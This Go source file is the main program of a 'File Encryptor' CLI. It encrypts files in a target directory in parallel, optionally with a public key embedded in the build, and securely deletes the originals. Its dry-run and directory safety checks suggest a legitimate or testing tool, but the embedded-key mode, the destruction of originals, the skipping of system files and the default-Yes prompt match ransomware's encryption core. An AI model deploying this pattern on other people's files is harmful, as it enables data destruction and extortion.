package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"file-crypto/internal/crypto"
	"file-crypto/internal/fs"
	"file-crypto/internal/system"
	"file-crypto/pkg/config"
)

var version = "dev"

type EncryptionStats struct {
	totalFiles      int64
	processedFiles  int64
	successfulFiles int64
	failedFiles     int64
	totalBytes      int64
}

func (s *EncryptionStats) incrementTotal() {
	atomic.AddInt64(&s.totalFiles, 1)
}

func (s *EncryptionStats) incrementProcessed() {
	atomic.AddInt64(&s.processedFiles, 1)
}

func (s *EncryptionStats) incrementSuccessful() {
	atomic.AddInt64(&s.successfulFiles, 1)
}

func (s *EncryptionStats) incrementFailed() {
	atomic.AddInt64(&s.failedFiles, 1)
}

func (s *EncryptionStats) addBytes(bytes int64) {
	atomic.AddInt64(&s.totalBytes, bytes)
}

func (s *EncryptionStats) getStats() (int64, int64, int64, int64, int64) {
	return atomic.LoadInt64(&s.totalFiles),
		atomic.LoadInt64(&s.processedFiles),
		atomic.LoadInt64(&s.successfulFiles),
		atomic.LoadInt64(&s.failedFiles),
		atomic.LoadInt64(&s.totalBytes)
}

// DataEncryptor abstracts the encryptor used by the CLI (symmetric or public-key based)
type DataEncryptor interface {
	EncryptData([]byte) ([]byte, error)
	SecureClear()
}

func main() {
	cfg, err := config.ParseFlags("File Encryptor")
	if err != nil {
		log.Fatalf("❌ Configuration error: %v", err)
	}

	// Quick confirmation (default Yes) unless -y/--yes provided
	if !cfg.AssumeYes {
		if !confirmProceed("Proceed with ENCRYPTION (files will be destroyed)? [Y/n]: ") {
			fmt.Println("Aborted.")
			return
		}
	}

	cfg.PrintConfig("File Encryptor")

	// Create encryptor
	var enc DataEncryptor
	if crypto.HasEmbeddedPublicKey() {
		// Embedded public key mode: no key file needed
		encPub, err := crypto.NewPublicEncryptorFromEmbedded()
		if err != nil {
			log.Fatalf("❌ Failed to initialize embedded-key encryptor: %v", err)
		}
		enc = encPub
		fmt.Println("🔐 Using embedded public key (v5 hybrid mode)")
		
		// Force system exclusions for embedded-key builds (safety feature)
		if !cfg.SystemExclusions {
			cfg.SystemExclusions = true
			fmt.Println("🛡️  System file protection: ENABLED (mandatory for embedded-key builds)")
		}
	} else {
		// Load encryption key from file (legacy symmetric mode)
		keyData, err := loadKey(cfg.KeyFile)
		if err != nil {
			log.Fatalf("❌ Failed to load key: %v", err)
		}
		encryptor, err := crypto.NewEncryptor(keyData)
		if err != nil {
			log.Fatalf("❌ Failed to create encryptor: %v", err)
		}
		enc = encryptor
	}
	defer enc.SecureClear()

	// Create system exclusions handler
	exclusions := system.NewExclusions(cfg.SystemExclusions)

	// Safety check: prevent running on dangerous system directories (unless --unsafe)
	if err := checkTargetDirectorySafety(cfg, exclusions); err != nil {
		log.Fatalf("❌ Target directory safety check failed: %v", err)
	}

	// Find files to encrypt
	fmt.Println("\n🔍 Scanning for files to encrypt...")
	files, err := findFilesToEncrypt(cfg.TargetDir, exclusions, cfg)
	if err != nil {
		log.Fatalf("❌ Failed to find files: %v", err)
	}

	if len(files) == 0 {
		fmt.Println("ℹ️  No files found to encrypt.")
		return
	}

	fmt.Printf("📁 Found %d files to encrypt\n", len(files))

	if cfg.DryRun {
		var totalBytes int64
		for _, f := range files {
			if sz, err := fs.GetFileSize(f); err == nil {
				totalBytes += sz
			}
		}
		fmt.Printf("\n[DRY-RUN] Would process %d files (%.2f MB)\n", len(files), float64(totalBytes)/(1024*1024))
		return
	}

	// Initialize statistics
	stats := &EncryptionStats{}
	for range files {
		stats.incrementTotal()
	}

	// Start benchmark timer
	startTime := time.Now()

	// Process files
	fmt.Printf("\n🚀 Starting encryption with %d workers...\n", cfg.MaxWorkers)
	processFiles(files, enc, stats, cfg)

	// Calculate final statistics
	endTime := time.Now()
	duration := endTime.Sub(startTime)

	// Print final statistics
	printFinalStats(stats, cfg.Benchmark, duration)
}

func loadKey(keyFile string) ([]byte, error) {
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		return nil, fmt.Errorf("key file '%s' not found", keyFile)
	}

	keyData, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read key file: %w", err)
	}

	// Remove any trailing whitespace/newlines
	return []byte(strings.TrimSpace(string(keyData))), nil
}

func findFilesToEncrypt(targetDir string, exclusions *system.Exclusions, cfg *config.Config) ([]string, error) {
	includeGlobs := parseGlobList(cfg.IncludeGlobs)
	excludeGlobs := parseGlobList(cfg.ExcludeGlobs)
	minSize := cfg.MinSizeBytes
	maxSize := cfg.MaxSizeBytes
	return fs.FindFiles(targetDir, func(path string, info os.FileInfo) bool {
		// Skip if already encrypted
		if fs.IsEncryptedFile(path) {
			return false
		}

		// Skip if should be excluded
		if exclusions.ShouldSkip(path) {
			return false
		}

		// Size filters
		if minSize > 0 && info.Size() < minSize {
			return false
		}
		if maxSize > 0 && info.Size() > maxSize {
			return false
		}

		// Glob filters
		if len(includeGlobs) > 0 && !matchAnyGlob(path, includeGlobs) {
			return false
		}
		if len(excludeGlobs) > 0 && matchAnyGlob(path, excludeGlobs) {
			return false
		}

		// Only encrypt files with allowed extensions (default allowlist)
		ext := strings.ToLower(filepath.Ext(path))
		if ext == "" || !isAllowedExtension(ext) {
			return false
		}

		return true
	})
}

func processFiles(files []string, enc DataEncryptor, stats *EncryptionStats, cfg *config.Config) {
	var wg sync.WaitGroup
	fileChan := make(chan string, len(files))

	// Start worker goroutines
	for i := 0; i < cfg.MaxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for filePath := range fileChan {
				processFile(filePath, enc, stats, cfg)
			}
		}()
	}

	// Send files to workers
	for _, filePath := range files {
		fileChan <- filePath
	}
	close(fileChan)

	// Wait for all workers to complete
	wg.Wait()
}

func processFile(filePath string, enc DataEncryptor, stats *EncryptionStats, cfg *config.Config) {
	stats.incrementProcessed()

	// Read file
	data, err := os.ReadFile(filePath)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Compress if enabled
	originalSize := len(data)
	if cfg.EnableCompression {
		compressedData, err := crypto.CompressData(data)
		if err != nil {
			if cfg.Verbose {
				fmt.Printf("❌ [Failed] %s: compression failed: %v\n", filepath.Base(filePath), err)
			}
			stats.incrementFailed()
			return
		}
		
		compressionRatio := float64(len(compressedData)) / float64(originalSize) * 100
		if cfg.Verbose {
			fmt.Printf("📦 Compressed %s: %d -> %d bytes (%.1f%%)\n", 
				filepath.Base(filePath), originalSize, len(compressedData), compressionRatio)
		}
		data = compressedData
	}

	// Encrypt
	encryptedData, err := enc.EncryptData(data)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: encryption failed: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Write encrypted file
	encryptedPath := filePath + ".encrypted"
	err = os.WriteFile(encryptedPath, encryptedData, 0644)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: write failed: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Secure delete original file
	secureOps := fs.NewSecureFileOperations(64 * 1024) // 64KB buffer
	if err := secureOps.SecureDelete(filePath); err != nil {
		if cfg.Verbose {
			fmt.Printf("⚠️  [Warning] %s: secure deletion failed: %v\n", filepath.Base(filePath), err)
		}
	}

	// Update statistics
	stats.addBytes(int64(originalSize))
	stats.incrementSuccessful()

	if cfg.Verbose {
		_, processedFiles, successfulFiles, _, _ := stats.getStats()
		fmt.Printf("✅ [%d/%d] %s -> %s\n", 
			successfulFiles-1, processedFiles, filepath.Base(filePath), filepath.Base(encryptedPath))
	}
}

func printFinalStats(stats *EncryptionStats, benchmark bool, duration time.Duration) {
	_, _, successfulFiles, failedFiles, totalBytes := stats.getStats()

	fmt.Printf("\n📊 Encryption Complete!\n")
	fmt.Printf("   ✅ Successful: %d\n", successfulFiles)
	fmt.Printf("   ❌ Failed: %d\n", failedFiles)

	if benchmark && successfulFiles > 0 {
		if duration > 0 {
			filesPerSec := float64(successfulFiles) / duration.Seconds()
			fmt.Printf("   ⏱️  Time: %.2f seconds\n", duration.Seconds())
			fmt.Printf("   📈 Rate: %.1f files/sec\n", filesPerSec)
			
			if totalBytes > 0 {
				bytesPerSec := float64(totalBytes) / duration.Seconds()
				fmt.Printf("   💾 Throughput: %s\n", formatRate(bytesPerSec))
			}
		}
	}
}

func parseGlobList(csv string) []string {
	var res []string
	for _, p := range strings.Split(csv, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			res = append(res, p)
		}
	}
	return res
}

func matchAnyGlob(path string, patterns []string) bool {
	unix := strings.ReplaceAll(path, "\\", "/")
	for _, pat := range patterns {
		pat = strings.ReplaceAll(pat, "\\", "/")
		if ok, _ := filepath.Match(pat, unix); ok {
			return true
		}
	}
	return false
}

func confirmProceed(prompt string) bool {
	fmt.Print(prompt)
	r := bufio.NewReader(os.Stdin)
	line, _ := r.ReadString('\n')
	s := strings.TrimSpace(strings.ToLower(line))
	if s == "" {
		return true
	}
	return s == "y" || s == "yes"
}